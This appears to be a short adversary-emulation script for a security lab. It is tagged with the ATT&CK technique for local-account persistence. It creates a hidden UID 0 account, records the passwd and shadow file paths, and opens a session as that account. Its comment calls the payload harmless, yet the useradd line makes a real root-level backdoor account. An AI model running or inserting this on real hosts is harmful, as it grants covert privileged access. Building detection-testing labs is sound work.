#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1136.001：本地账号持久化——创建 UID 0 隐藏账号并产生登入会话
useradd -o -u 0 -M -N -s /bin/bash svcmaint 2> useradd.txt || echo "useradd rc=$?" >> useradd.txt
{ echo /etc/passwd; echo /etc/shadow; } > system_paths.txt
su - svcmaint -c 'id > whoami-evidence.txt 2>&1' || true
